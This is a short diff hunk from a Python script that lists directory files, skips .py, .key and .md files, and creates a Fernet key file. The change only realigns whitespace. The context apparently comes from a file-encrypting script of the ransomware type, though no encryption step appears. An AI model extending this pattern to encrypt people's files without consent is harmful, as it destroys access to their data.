@@ -6,7 +6,7 @@ from cryptography.fernet import Fernet
 files           = os.listdir()
 targets         = []
 current_key     = 'key.key'
-excluded_files = ('.py', '.key', '.md')
+excluded_files  = ('.py', '.key', '.md')
 
 # Generate encryption key if it is not exist and save it to a text file 
 if not os.path.exists(current_key):
